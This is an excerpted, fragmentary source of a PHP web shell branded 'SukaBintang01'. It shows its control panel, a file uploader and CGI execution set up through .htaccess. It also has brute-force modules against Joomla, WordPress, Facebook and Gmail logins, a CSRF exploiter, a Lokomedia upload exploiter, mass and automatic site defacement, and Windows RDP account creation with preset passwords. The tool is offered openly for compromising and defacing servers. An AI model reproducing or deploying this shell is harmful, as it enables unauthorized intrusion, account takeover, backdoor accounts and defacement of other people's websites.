...
function login_shellbackdoor() {
    ...
    <html>
    <head>
        <link rel="SHORTCUT ICON" href="https://i.ibb.co/BVd254m/Suka-Bintang01.png">
        <title>xXx::.SukaBintang01.::xXx</title>
        <style type="text/css">
            html {
                background: #000000;
                color: green;
...
if (isset($_SESSION['is_logged_in']) && $_SESSION['is_logged_in']) {
    ...
    echo "<a href='?logout=true' style='color: red;'>Logout</a>";
    echo "<br><br>Welcome to your shell!";
...
<center><div id="contenttengah"><center>
		<img title="SukaBintang01"src="https://i.ibb.co.com/BVd254m/Suka-Bintang01.png" width="70%"></div> </center>


<span class="style4"> Shell Script: <br>SukaBintang01</span><br><br>
<span class="style4">Official Member: <br>SukaBintang01 - Tn_wizyakuza - WhiteRose </span><br><br>
<span class="style4">Greetz : <br> GarudaSecurity </span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">SukaBintang01 Bypass</font><br><br><br>
<font style="font: 15pt Verdana; color: red;">Welcome Hackers!!</font><br><br>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background="https://i.ibb.co.com/BVd254m/Suka-Bintang01.png"><p id="hack" style="margin-left: 3px;">
<font color="lime"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
<font color="#FFF000"> Searching For Available Users . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#FFF000"> Users Found : <font color = 'red'>root@SukaBintang01:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@SukaBintang01:~$</font> Connected ! </font><br>
...
<font color="red">root@SukaBintang01:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<font color = "red" face = "Verdana">Visit Us! : https://sukabintang01.netlify.app </font>
<audio controls autoplay hidden>
				<source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">
			</audio><br><br>
<font color = "red" face = "Verdana">@CopyRights SukaBintang01 2024</font> 			
<?php
exit;
}
...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://i.ibb.co.com/BVd254m/Suka-Bintang01.png">
<title>xXx::. Hacked By SukaBintang01 .::xXx</title>
<meta name='author' content='SukaBintang01'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://i.ibb.co.com/BVd254m/Suka-Bintang01.png' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ SukaBintang01 Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://i.ibb.co.com/BVd254m/Suka-Bintang01.png' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
//Fungsi log dinonaktifkan oleh SukaBintang01 
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By SukaBintang01 ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By SukaBintang01 ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By SukaBintang01 ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
	...
	<meta name="author" content="https://i.ibb.co.com/BVd254m/Suka-Bintang01.png" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="SukaBintang01" />
<center>
</br></br>
<center><b><font color="lime">+--=[ HECKER BY SUKABINTANG01 ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By SukaBintang01 ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce By SukaBintang01  ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
# Coded by : SukaBintang01                      #
# Greetz : All Garsec Members                   #
# sukabintang01.netlify.app                     #
# --------------------------------------------- #
#################################################
 
echo "
<head>
<link rel='icon' type='image/ico' href='https://i.ibb.co.com/BVd254m/Suka-Bintang01.png'/>
<form method='POST'>
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by SukaBintang01 || Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : SukaBintang01 <br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : SukaBintang01 </font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce By SukaBintang01  ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce SukaBintang01 </span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By SukaBintang01'><br>POST CONTENT: <input type='text' name='content' value='Hacked By SukaBintang01'><br>POSTNAME: <input type='text' name='postname' value='HackeD By SukaBintang01'><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.SukaBintang01";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_SukaBintang01 \n AddHandler cgi-script .Index_SukaBintang01 \n AddHandler cgi-script .Index_SukaBintang01";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.SukaBintang01' target='_blank'>Klik Here</a>";
}
...
elseif($_GET['do'] == 'cgi') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.SukaBintang01' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.SukaBintang01 ' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "SukaBintang01 Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
echo '<form action="?dir=$dir&do=logout" method="post">';
	...
	<font color='white'>Instagram : SukaBintang01</font><br></tr></td></table></center>";
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : SukaBintang01</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By SukaBintang01 </h1><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<input type='text' name='d_file' value='sukabintang01.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By SukaBintang01 </textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='Hacker' size='50' value='SukaBintang01'><br>
		<u>Team</u>: <br>
		<input type='text' name='Team' size='50' value=' GarudaSecurity'><br>
		<u>Domains</u>: <br>
...
$data_to_post = array();
$data_to_post['SukaBintang01'] = "$hacker";
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='GarudaSecurity' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='SukaBintang01' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By SukaBintang01 ' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='SukaBintang01 '><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By SukaBintang01 ' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user SukaBintang01 ");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>SukaBintang01 </font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='GarudaSecurity' required>
			<input type='text' name='pass' placeholder='password' value='SukaBintang01' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'> Shell By SukaBintang01 ";
	}
?> 
